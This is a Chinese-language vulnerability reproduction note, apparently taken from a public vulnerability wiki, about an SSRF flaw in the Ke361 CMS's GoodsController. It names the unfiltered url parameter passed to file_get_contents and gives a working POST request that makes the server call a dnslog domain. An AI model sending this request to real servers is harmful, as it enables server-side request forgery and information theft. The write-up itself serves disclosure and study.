---
title: "Ke361 GoodsController.class.php SSRF漏洞"
date: 2026-10-12 09:00:39
categories:
  - WebSecurity
  - CVE
  - "cms"
  - "Ke361"
tags:
  - "Ke361"
  - "SSRF"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

Ke361 GoodsController.class.php URL参数存在 SSRF漏洞，通过漏洞可以获取敏感信息

## 漏洞影响

```
Ke361
```

## 环境搭建

https://gitee.com/jcove/ke361

## 漏洞复现

存在漏洞的文件为 `Application/Home/Controller/GoodsController.class.php`

![image-20220518153445715](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202205181534788.png)

URL参数无任何过滤，传入 file_get_contents函数，造成SSRF漏洞，构造请求

```
POST /index.php?s=/Goods/ajGetGoodsDetial
 
url=http://6si2gt.dnslog.cn
```

![image-20220518153459466](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202205181534535.png)

dnslog接收到请求

![image-20220518153527567](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202205181535619.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/cms/Ke361-GoodsController.class.php-SSRF%E6%BC%8F%E6%B4%9E.md)
